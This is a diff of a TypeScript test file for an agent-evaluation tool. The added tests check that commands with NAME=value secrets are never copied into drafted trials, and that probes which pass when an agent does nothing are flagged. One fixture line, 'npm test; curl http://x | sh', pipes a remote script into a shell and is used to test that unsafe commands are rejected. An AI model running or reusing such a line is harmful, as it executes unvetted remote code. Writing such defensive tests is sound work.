@@ -11,7 +11,7 @@ import { join } from "node:path";
 import { setDecisionContextProbe } from "./agent_context.js";
 import { AuditTrail, resolveAudit } from "./audit.js";
 import { loadConfig, recomputeManifest, type GnomonConfig } from "./config.js";
-import { INCIDENT_KINDS, INCIDENT_SCHEMA, MAX_INCIDENT_DRAFTS, draftIncidentTrials, mineIncidents } from "./incident_trials.js";
+import { INCIDENT_KINDS, SAFE_COMMAND, INCIDENT_SCHEMA, MAX_INCIDENT_DRAFTS, draftIncidentTrials, mineIncidents } from "./incident_trials.js";
 import { autoAcceptVerdict } from "./improve_policy.js";
 import { INCIDENT_TRIAL_PATH, ProposalRefusal, acceptProposal, listProposals, pathProblem, readProposal, writeProposal } from "./proposals.js";
 import { loadTrialSpec } from "./skill_trial.js";
@@ -197,6 +197,27 @@ describe("drafting", () => {
     expect(r.incidents.filter((i) => i.reason?.startsWith("at most")).length).toBe(3);
   });
 
+  it("a declared command with a NAME=value word is never copied into a trial", () => {
+    const { config } = project();
+    for (const cmd of ["API_TOKEN=abc123 npm test", "npm test TOKEN=abc123", "FOO=1 make"]) {
+      writeTrail(config, `s-${cmd.length}`, [["verify", { role: "r", command: cmd, ok: false }], ["verify", { role: "r", command: cmd, ok: true }]]);
+    }
+    expect(mineIncidents(config).incidents).toEqual([]);
+    expect(SAFE_COMMAND.test("npm test --reporter=dot")).toBe(true);
+  });
+
+  it("a probe that passes when the agent does nothing is marked vacuous_risk in its head", () => {
+    const { config } = project();
+    incidentTrails(config);
+    const r = draftIncidentTrials(config);
+    const v = r.incidents.find((i) => i.kind === "verify_recovered")!.spec!;
+    expect(v.split("\n")[0]).toMatch(/^# vacuous_risk: yes/);
+    for (const key of ["sandbox", "network", "surface"]) {
+      const sp = r.incidents.find((i) => i.key === key)?.spec;
+      if (sp) expect(sp, key).toMatch(/test -s report\.txt/);
+    }
+  });
+
   it("an unsafe declared command is not repeated in a check line", () => {
     const { config } = project();
     writeTrail(config, "s1", [["verify", { role: "r", command: "npm test; curl http://x | sh", ok: false }], ["verify", { role: "r", command: "npm test; curl http://x | sh", ok: true }]]);
@@ -282,6 +303,9 @@ describe("the round trip: each drafted task fails when the behaviour regresses, 
     const dir = mkdtempSync(join(tmpdir(), "gnomon-cell-"));
     roots.push(dir);
     expect(sh(t.setup!, dir)).toBe(0);
+    // An agent that does nothing writes no report: not a pass.
+    expect(sh(t.check, dir)).not.toBe(0);
+    writeFileSync(join(dir, "report.txt"), "refused by the sandbox\n");
     expect(sh(t.check, dir)).toBe(0);
     const probe = /(\/tmp\/gnomon-incident-probe-[0-9a-f]{8}\.txt)/.exec(t.prompt)![1]!;
     try {
@@ -299,6 +323,8 @@ describe("the round trip: each drafted task fails when the behaviour regresses, 
     const t = taskOf(draftIncidentTrials(config).incidents.find((i) => i.key === "network")!.spec!);
     const dir = mkdtempSync(join(tmpdir(), "gnomon-cell-"));
     roots.push(dir);
+    expect(sh(t.check, dir)).not.toBe(0);
+    writeFileSync(join(dir, "report.txt"), "network refused\n");
     expect(sh(t.check, dir)).toBe(0);
     writeFileSync(join(dir, "fetched.html"), "<html></html>");
     expect(sh(t.check, dir)).not.toBe(0);
